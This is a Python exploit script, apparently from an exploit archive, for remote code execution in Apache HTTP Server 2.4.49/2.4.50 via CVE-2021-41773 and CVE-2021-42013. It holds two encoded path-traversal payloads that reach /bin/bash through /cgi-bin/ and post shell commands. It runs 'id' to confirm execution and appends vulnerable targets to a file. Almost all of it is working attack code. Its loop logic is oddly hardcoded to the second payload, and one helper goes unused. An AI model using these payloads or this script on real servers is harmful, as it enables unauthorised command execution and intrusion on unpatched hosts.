# Exploit Title: Apache HTTP Server 2.4.50 - Remote Code Execution (RCE) (3)
# Date: 11/11/2021
# Exploit Author: Valentin Lobstein
# Vendor Homepage: https://apache.org/
# Version: Apache 2.4.49/2.4.50 (CGI enabled)
# Tested on: Debian GNU/Linux
# CVE : CVE-2021-41773 / CVE-2021-42013
# Credits : Lucas Schnell


#!/usr/bin/env python3
#coding: utf-8

import os
import re
import sys
import time
import requests




if len(sys.argv) < 2 :
    print( 'Use: python3 file.py ip:port ' )
    sys.exit()

def end():
    print("\t\033[1;91m[!] Bye bye !")
    time.sleep(0.5)
    sys.exit(1)


def mute_command(url,command):
    session = requests.Session()
    req = requests.Request('POST', url=url, data=f"echo; {command}")
    prepare = req.prepare()
    prepare.url = url  
    response = session.send(prepare, timeout=5)
    return response.text.strip()


def exploitRCE(payload):
    s = requests.Session()
    try:
        host = sys.argv[1]
        if 'http' not in host:
            url = 'http://'+ host + payload
        else:
            url = host + payload 
        print(url)
        session = requests.Session()
        command = "echo; id"
        req = requests.Request('POST', url=url, data=command)
        prepare = req.prepare()
        prepare.url = url  
        response = session.send(prepare, timeout=5)
        output = response.text
        if "uid" in output:
            with open('list.txt', 'a') as file:
                file.write(url+"\n")    
        else :
            print('\nTarget %s isn\'t vulnerable' % host)
    except KeyboardInterrupt:
        end()

def main():
    try:
        apache2449_payload = '/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/bash'
        apache2450_payload = '/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/bash'
        payloads = [apache2449_payload,apache2450_payload]
        choice = len(payloads) + 1
        while choice >= len(payloads) and choice >= 0:
            choice = 1
            if choice < len(payloads):
                exploitRCE(payloads[choice])
    except KeyboardInterrupt:
            time.sleep(0.5)
            sys.exit(1)

if __name__ == '__main__':
    main()